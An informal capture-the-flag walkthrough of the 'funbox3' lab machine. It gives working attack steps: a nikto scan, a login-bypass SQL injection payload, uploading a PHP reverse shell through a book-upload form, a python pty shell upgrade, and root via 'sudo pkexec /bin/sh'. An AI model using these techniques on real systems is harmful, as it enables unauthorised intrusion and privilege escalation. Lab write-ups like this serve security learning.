When i  did the the search on the server, it is important to make a search on /robots.txt... manually it's doesnt necesary to make a dirsearch or dirbuster .. we can do it manually

The guy said that it is important to make an " inmigration " and he is using a tool called NIKTO

sudo nikto -h http://192.168.0.31 #nikto

```
+ Multiple index files found: /index.php, /index.html.
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ /admin/: This might be interesting.
+ /secret/: This might be interesting.
+ /store/: This might be interesting.
+ /admin/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
+ 8103 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2023-07-26 20:41:04 (GMT2) (30 seconds)
---------------------------------------------------------------------------
```

in the /admin/ we have a CRM loggin (Costumer Relationship Manadgement)

i logged in with

A simple SQL injection

admin' or '1'='1'#

In a url of the pages we have this

```
http://192.168.0.31/admin/quote-details.php?id=11
```
an url where we can search directorys

But this guy is saying that we must use #burpsuit to manage the packets sended because of the "ID on the php search" 
The reason of using burpsuit , he said that we can make an sql injection. 
WE NEED TO DUMP SOME CREDENTIALS FROM THE DATABASe

and.. now he is saying this is not the way... we must search on the "store" directory.
We can log us on this page without credentials.. just with "admin"






WE CAN ADD BOOKS AND ARCHIVES.. so we are going to try to put a reverse shell.php on it

we inserted it on the  "...ad a new book" but... how we can execute it ?

going to the directory on the browser... and just going in to it we have the reverse shell.. 

http://192.168.0.32/store/bootstrap/img/php-reverse-shell.php

obviously you need to listen first on the port with netcat

now we import this because the console have python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")' 

we are in a folder of tony ... and we found a password.txt
and now we log with su -tony , and then the password

sudo -l gives us this

```
tony@funbox3:~$ sudo -l
sudo -l
Matching Defaults entries for tony on funbox3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD:
        /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
```

it is good to watch on https://gtfobins.github.io/ and you can see if some of this commands helps you to get in on 

and !! this is the command 

sudo /usr/bin/pkexec /bin/sh 

so we can now find the root flag.